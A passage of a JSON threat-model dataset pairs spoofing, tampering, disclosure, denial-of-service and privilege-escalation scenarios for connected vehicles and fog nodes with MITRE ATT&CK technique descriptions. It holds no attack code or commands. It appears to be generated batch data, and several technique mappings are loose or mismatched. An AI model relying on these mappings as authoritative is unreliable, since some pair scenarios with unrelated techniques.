                {
                    "Assumption": "Sensitive data is transmitted between nodes and cloud without encryption",
                    "Role": "Communication Protocols",
                    "Condition": "Sensitive data transmission"
                }
            ],
            "Potential Impact": "Unauthorized access and potential leakage of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Fog nodes process and store sensitive data that is accessed unauthorizedly due to weak access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are weak or nonexistent",
                    "Role": "System Designer",
                    "Condition": "Inadequate access control"
                },
                {
                    "Assumption": "Sensitive data is stored locally on fog nodes",
                    "Role": "Fog Node",
                    "Condition": "Local data storage"
                },
                {
                    "Assumption": "Attackers can exploit vulnerabilities to access this data",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data and breach of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control",
                "data storage",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive vehicle data exposed due to insufficient authentication and data protection measures.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient data protection measures are in place",
                    "Role": "System Designer",
                    "Condition": "Lack of data protection"
                },
                {
                    "Assumption": "Vehicles transmit sensitive data without proper encryption",
                    "Role": "Vehicle",
                    "Condition": "Unencrypted transmission"
                },
                {
                    "Assumption": "Attackers can tap into communication streams between vehicles and fog nodes",
                    "Role": "Attacker",
                    "Condition": "Interception capability"
                }
            ],
            "Potential Impact": "Exposure and potential misuse of vehicle and user data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "authentication",
                "encryption",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding fog nodes with excessive data, leading to resource exhaustion and service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have limited resource capacity",
                    "Role": "System Designer",
                    "Condition": "Resource constraints"
                },
                {
                    "Assumption": "No rate limiting or data filtering mechanisms are in place",
                    "Role": "System Designer",
                    "Condition": "Absence of rate limiting"
                },
                {
                    "Assumption": "Attacker has means to generate large volumes of data",
                    "Role": "Attacker",
                    "Condition": "High data generation capability"
                }
            ],
            "Potential Impact": "Service disruption, making fog nodes unable to process legitimate data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "flooding",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Targeted attacks on RSUs leading to localized denial of service affecting critical traffic management.",
            "Assumptions": [
                {
                    "Assumption": "RSUs are accessible and have vulnerabilities",
                    "Role": "System Designer",
                    "Condition": "Accessible RSUs"
                },
                {
                    "Assumption": "No robust defensive measures in place",
                    "Role": "System Designer",
                    "Condition": "Lack of defenses"
                },
                {
                    "Assumption": "Attackers can identify and exploit these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation"
                }
            ],
            "Potential Impact": "Localized DoS affecting real-time traffic management and vehicle coordination.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "RSUs",
                "traffic management",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Compromised cloud services leading to failure of back-end processing and long-term data storage.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have vulnerabilities that can be exploited remotely",
                    "Role": "System Designer",
                    "Condition": "Cloud vulnerabilities"
                },
                {
                    "Assumption": "No robust cloud service defense mechanisms",
                    "Role": "System Designer",
                    "Condition": "Lack of cloud defenses"
                },
                {
                    "Assumption": "Attackers can remotely disrupt cloud services",
                    "Role": "Attacker",
                    "Condition": "Remote disruption capability"
                }
            ],
            "Potential Impact": "Disruption in back-end processing, analytical services, and long-term data storage.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "back-end processing",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker escalates privileges on fog nodes to gain unauthorized access and control.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have exploitable vulnerabilities",
                    "Role": "System Designer",
                    "Condition": "Vulnerable fog nodes"
                },
                {
                    "Assumption": "Insufficient privilege separation and access control",
                    "Role": "System Designer",
                    "Condition": "Inadequate privilege management"
                },
                {
                    "Assumption": "Attackers can leverage vulnerabilities to escalate privileges",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation"
                }
            ],
            "Potential Impact": "Unauthorized access and control over fog node operations and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "vulnerabilities",
                "node control"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised vehicle systems allowing attackers to gain higher-level control and access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Vehicle systems have security weaknesses",
                    "Role": "System Designer",
                    "Condition": "Vehicle vulnerabilities"
                },
                {
                    "Assumption": "No secure mechanisms to prevent privilege escalation",
                    "Role": "System Designer",
                    "Condition": "Lack of security mechanisms"
                },
                {
                    "Assumption": "Attackers can physically or remotely access vehicle systems",
                    "Role": "Attacker",
                    "Condition": "Access to vehicle systems"
                }
            ],
            "Potential Impact": "Gaining unauthorized control over vehicle operations and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vehicle systems",
                "remote access",
                "data access"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker leverages cloud service vulnerabilities to gain administrative access to cloud resources.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have elevated levels of access and control",
                    "Role": "Cloud Service",
                    "Condition": "Elevated access levels"
                },
                {
                    "Assumption": "Vulnerabilities exist in cloud service management interfaces",
                    "Role": "System Designer",
                    "Condition": "Vulnerable management interfaces"
                },
                {
                    "Assumption": "Attackers can remotely access and exploit these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Remote exploitation"
                }
            ],
            "Potential Impact": "Complete control over cloud services and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud resources",
                "admin access",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversary impersonates a legitimate smart vehicle to send false data to fog nodes",
            "Assumptions": [
                {
                    "Assumption": "Vehicles do not have strong mutual authentication mechanisms with fog nodes.",
                    "Role": "System Designer",
                    "Condition": "Current authentication methods are weak or non-existent."
                },
                {
                    "Assumption": "Adversary has access to the communication channel used by vehicles.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary is positioned in a network where they can intercept or inject traffic."
                },
                {
                    "Assumption": "Fog nodes do not validate vehicle identities robustly.",
                    "Role": "System Administrator",
                    "Condition": "Lack of validation protocols or inadequate implementation by fog nodes."
                }
            ],
            "Potential Impact": "Unauthorized data affecting system integrity and availability",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversary impersonates a fog node to intercept data from smart vehicles",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have a robust authentication mechanism.",
                    "Role": "System Designer",
                    "Condition": "Authentication protocols between vehicles and fog nodes are weak or missing."
                },
                {
                    "Assumption": "Adversary has access to the network where fog nodes are deployed.",
                    "Role": "Threat Actor",
                    "Condition": "The network is not properly secured or adversary has physical access."
                },
                {
                    "Assumption": "Vehicles trust any fog node without a proper validation check.",
                    "Role": "Vehicle Manufacturer",
                    "Condition": "Vehicles trust any node due to inadequate node identification validation."
                }
            ],
            "Potential Impact": "Unauthorized disclosure and integrity loss",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor impersonates cloud services to deceive fog nodes",
            "Assumptions": [
                {
                    "Assumption": "Communications between fog nodes and cloud services are not authenticated.",
                    "Role": "System Architect",
                    "Condition": "There is no authentication for cloud services that fog nodes communicate with."
                },
                {
                    "Assumption": "Adversary can monitor and inject traffic within the fog nodes' network.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary has network access or can monitor traffic."
                },
                {
                    "Assumption": "Fog nodes do not validate the identity of cloud services effectively.",
                    "Role": "System Administrator",
                    "Condition": "Fog nodes are configured to trust any cloud service without proper validation."
                }
            ],
            "Potential Impact": "System integrity and confidentiality compromised",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "device",
                "deception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversary modifies data being transmitted between smart vehicles and fog nodes",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions between vehicles and fog nodes are not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption leads to the vulnerability."
                },
                {
                    "Assumption": "Adversary has access to the communication channel.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary is in a position to intercept and modify the data."
                },
                {
                    "Assumption": "Vehicles and fog nodes do not verify data integrity after transmission.",
                    "Role": "System Administrator",
                    "Condition": "Integrity checks are not implemented effectively."
                }
            ],
            "Potential Impact": "System integrity and availability compromised",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actor alters software on fog nodes",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have adequate software integrity validation mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Absence or weakness of software tampering detection mechanisms."
                },
                {
                    "Assumption": "Adversary gains physical or remote access to fog nodes.",
                    "Role": "Threat Actor",
                    "Condition": "Adversary can physically interact with or remotely exploit vulnerabilities on fog nodes."
                },
                {
                    "Assumption": "System lacks robust update mechanisms to ensure software authenticity.",
                    "Role": "System Administrator",
                    "Condition": "Software updates are not signed or authenticated properly."
                }
            ],
            "Potential Impact": "System integrity and availability loss",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device",
                "software",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
